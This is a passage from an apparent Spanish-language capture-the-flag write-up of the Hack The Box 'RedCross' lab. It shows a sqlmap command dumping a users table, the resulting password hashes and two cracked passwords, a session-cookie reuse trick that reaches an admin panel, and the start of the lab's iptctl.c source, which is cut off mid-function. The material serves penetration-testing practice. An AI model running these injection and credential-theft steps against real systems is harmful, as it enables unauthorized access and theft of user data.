&lt;p&gt;Utilizamos burpsuite para capturar el trafico y capturar una solicitud de la SQLi para luego hacer uso de sqlmap con la solicitud, para luego encontrar usuarios y contraseñas, tambien encontramos mensajes de correos electronicos entre los &lt;code&gt;administradores&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;GET /?o=1&amp;amp;page=app HTTP/1.1
Host: intra.redcross.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://intra.redcross.htb/?page=app
Cookie: PHPSESSID=vo690q6cktgv56j97dabra5bm3; LANG=EN_US; SINCE=1547616286; LIMIT=10; DOMAIN=intra
Connection: close
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;sqlmap&#34;&gt;SQLMAP&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sqlmap -r sql.req --batch --level&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; --risk&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; -D redcross -T users --dump
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;Database: redcross
Table: users
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----+------+------------------------------+----------+--------------------------------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; role &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; mail                         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; username &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; password                                                     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+------+------------------------------+----------+--------------------------------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; admin@redcross.htb           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; admin    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$z&lt;/span&gt;/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; penelope@redcross.htb        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; penelope &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$tY9Y955kyFB37GnW4xrC0&lt;/span&gt;.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; charles@redcross.htb         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; charles  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$bj5Qh0AbUM5wHeu&lt;/span&gt;/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tricia.wanderloo@contoso.com &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tricia   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$Dnv&lt;/span&gt;/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; non@available                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; guest    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$U16O2Ylt&lt;/span&gt;/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----+------+------------------------------+----------+--------------------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;Database: redcross
Table: messages
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
id,body,dest,origin,subject
1,You&lt;span class=&#34;s1&#34;&gt;&amp;#39;re granted with a low privilege access while we&amp;#39;&lt;/span&gt;re processing your credentials request. Our messaging system still in beta status. Please report &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you find any incidence.,5,1,Guest Account Info
2,&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hi Penny, can you check if is there any problem with the order? I&amp;#39;m not receiving it in our EDI platform.&amp;#34;&lt;/span&gt;,2,4,Problems with order &lt;span class=&#34;m&#34;&gt;02122128&lt;/span&gt;
3,&lt;span class=&#34;s2&#34;&gt;&amp;#34;Please could you check the admin webpanel? idk what happens but when I&amp;#39;m checking the messages, alerts popping everywhere!! Maybe a virus?&amp;#34;&lt;/span&gt;,3,1,Strange behavior
4,&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.&amp;#34;&lt;/span&gt;,4,2,Problems with order &lt;span class=&#34;m&#34;&gt;02122128&lt;/span&gt;
5,&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!&amp;#34;&lt;/span&gt;,2,3,admin subd webapp problems
6,&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hi, Yes it&amp;#39;s strange because we applied some input filtering on the contact form. Let me check it. I&amp;#39;ll take care of that since now! KR&amp;#34;&lt;/span&gt;,3,2,admin subd webapp problems &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;priority&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
7,&lt;span class=&#34;s2&#34;&gt;&amp;#34;Hi, Please stop checking messages from intra platform, it&amp;#39;s possible that there is a vuln on your admin side... &amp;#34;&lt;/span&gt;,1,2,STOP checking messages from intra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;priority&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
8,Sorry but I can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t do that. It&amp;#39;&lt;/span&gt;s the only way we have to communicate with partners and we are overloaded. Doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t look so bad... besides that what colud happen? Don&amp;#39;&lt;/span&gt;t worry but fix it ASAP.,2,1,STOP checking messages from intra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;priority&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con la vulnerabilidad SQLi solo se pudo sacar mensajes y usuarios, no se pudo ir más alla (shell, lectura, escritura de archivos,etc). Intentando crackear las contraseñas con hashcat solo logramos sacar dos pero no sirvieron de mucho:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;guest:&lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$U16O2Ylt&lt;/span&gt;/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi:guest
charles:&lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$10$bj5Qh0AbUM5wHeu&lt;/span&gt;/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i:cookiemonster
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Pero los mensajes nos dan una idea de lo que podriamos hacer, hablan de &lt;code&gt;admin webpanel&lt;/code&gt; el cual no pudimos encontrar con gobuster, pero podria ser algo más que un directorio, un subdominio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;10.10.10.113	redcross.htb intra.redcross.htb admin.redcross.htb webpanel.redcross.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al visitar &lt;code&gt;webpanel.redcross.htb&lt;/code&gt; solo nos redirige de nuevo a &lt;code&gt;intra.redcross.htb&lt;/code&gt;, pero si visitamos &lt;code&gt;admin.redcross.htb&lt;/code&gt;, nos muestra un nuevo panel de administracion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/admin-redcross-panel.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos utilizar los mismos credenciales pero nos muestra un mensaje:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;Not enough privileges!
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;cookies&#34;&gt;COOKIES&lt;/h2&gt;
&lt;p&gt;Ya que el subdominio intra y admin pertenecen a la misma maquina intentamos utilizar las cookies del subdominio intra en el de admin utilizando &lt;code&gt;Cookie Manager&lt;/code&gt; con los cuales pudimos logearnos como usuario &lt;code&gt;guest&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Observamos dos &lt;code&gt;User Management, Network Access&lt;/code&gt;, en la primera opcion podemos borrar y agregar usuarios, y el server nos genera una contraseña que podemos utilizar para logearnos mediante ssh.&lt;/p&gt;
&lt;p&gt;Agregamos un Usuario&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/admin-panel-user.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos devuelve el usuario y contraseña&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/admin-panel-create-user.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos logeamos con las credenciales al servicio ssh&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/admin-create-user-ssh-login.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Con el usuario que creamos(nemesis) no pudimos hacer mucho, pero encontramos un archivo &amp;lsquo;iptctl.c&amp;rsquo;, el cual restringe o permite el acceso a la maquina, añadiendo una IP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt; * Small utility to manage iptables, easily executable from admin.redcross.htb
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt; * v0.1 - allow and restrict mode
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt; * v0.3 - added check method and interactive mode (still testing!)
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;

&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;arpa/inet.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#define BUFFSIZE 360
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isValidIpAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ipAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
